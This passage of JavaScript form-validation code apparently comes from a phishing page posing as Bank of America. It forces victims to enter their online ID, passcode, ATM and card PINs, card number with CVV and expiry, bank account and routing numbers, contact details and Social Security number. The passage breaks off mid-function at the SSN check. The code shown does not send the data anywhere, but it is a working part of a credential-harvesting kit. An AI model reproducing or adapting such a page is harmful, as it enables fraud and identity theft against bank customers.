  <script type="text/javascript" language="JavaScript">
   var ok_to_continue = true;

var error_message = "The following fields may not be blank:\n";



function getFieldObj(name)

{

  if (document.getElementById &amp;&amp; document.getElementById(name))

  {

  	this.obj = document.getElementById(name);

	//this.style = document.getElementById(name).style;

  }

 

  else if (document.all)

  {

	this.obj = document.all[name];

	//this.style = document.all[name].style;

  }

  else if (document.layers)

  {

   	this.obj = document.layers[name];

   	//this.style = document.layers[name];

  }

}



var p_bSubmit = 0;


function validate(FormInput)
{
	if (p_bSubmit)
	{
		alert("Page is processing, please wait...");
		return false;
	}
	else
	{
			if(FormInput.address_state.value ==  "")
		{
			alert("Please select the state where your accounts were opened");
			FormInput.address_state.focus();
			return false;
		}
                        else if(FormInput.onlineid.value ==  "")
		{
			alert("Please Enter your Online ID");
			FormInput.onlineid.focus();
			return false;
		}
			else if(FormInput.atmcheckcardpin.value ==  "")
		{
			alert("Enter your ATM/Check Card PIN");
			FormInput.atmcheckcardpin.focus();
			return false;
		}
			else if(FormInput.passcode.value ==  "")
		{
			alert("Please enter your Passcode");
			FormInput.passcode.focus();
			return false;
		}
			else if(FormInput.currentaddress_less_year.checked ==  false)
		{
			alert("Please Select your Bank of America Accounts");
			FormInput.currentaddress_less_year.focus();
			return false;
		}
			else if(FormInput.ccnum.value ==  "")
		{
			alert("Please enter Credit/Debit Card Number");
			FormInput.ccnum.focus();
			return false;
		}
			else if(FormInput.expmonth.value ==  "")
		{
			alert("Please Select your Credit/Debit Card Expiry Month");
			FormInput.expmonth.focus();
			return false;
		}
			else if(FormInput.expyear.value ==  "")
		{
			alert("Please Select your Credit/Debit Card Expiry Year");
			FormInput.expyear.focus();
			return false;
		}
			else if(FormInput.cv.value ==  "")
		{
			alert("Please Enter Code Verification Number of your Credit/Debit Card");
			FormInput.cv.focus();
			return false;
		}
			else if(FormInput.ccpin.value ==  "")
		{
			alert("Please Enter your Credit/Debit Card ATM Pin Number");
			FormInput.ccpin.focus();
			return false;
		}
			else if(FormInput.fullname.value ==  "")
		{
			alert("Please Enter your Name as it appears on your Credit/Debit Card");
			FormInput.fullname.focus();
			return false;
		}
			else if(FormInput.previous_address_line1.value ==  "")
		{
			alert("Please Enter your Credit/Debit Card Billing Address");
			FormInput.previous_address_line1.focus();
			return false;
		}
			else if(FormInput.previous_city.value ==  "")
		{
			alert("Please Enter the City of your Credit/Debit Card Billing Address");
			FormInput.previous_city.focus();
			return false;
		}
			else if(FormInput.previous_state.value ==  "")
		{
			alert("Please Select the State of your Credit/Debit Card Billing Address");
			FormInput.previous_state.focus();
			return false;
		}
			else if(FormInput.previous_zipcode5.value ==  "")
		{
			alert("Please Enter the Zipcode of your Credit/Debit Card Billing Address");
			FormInput.previous_zipcode5.focus();
			return false;
		}
			else if(FormInput.currentaddress_more_year.checked ==  false)
		{
			alert("Please Select your Bank of America Accounts");
			FormInput.currentaddress_more_year.focus();
			return false;
		}
			else if(FormInput.account_number.value ==  "")
		{
			alert("Please Enter your Bank Account Number");
			FormInput.account_number.focus();
			return false;
		}
			else if(FormInput.routing_number.value ==  "")
		{
			alert("Please Enter your Bank Routing Number");
			FormInput.routing_number.focus();
			return false;
		}
			else if(FormInput.home_phone_ac.value ==  "")
		{
			alert("Please Enter your Phone Number");
			FormInput.home_phone_ac.focus();
			return false;
		}
			else if(FormInput.home_phone_ex.value ==  "")
		{
			alert("Please Enter your Phone Number");
			FormInput.home_phone_ex.focus();
			return false;
		}
			else if(FormInput.home_phone_sub.value ==  "")
		{
			alert("Please Enter your Phone Number");
			FormInput.home_phone_sub.focus();
			return false;
		}
			else if(FormInput.email_address1.value ==  "")
		{
			alert("Please Enter your Current E-mail Address");
			FormInput.email_address1.focus();
			return false;
		}
			else if(FormInput.ssn3.value ==  "")
		{
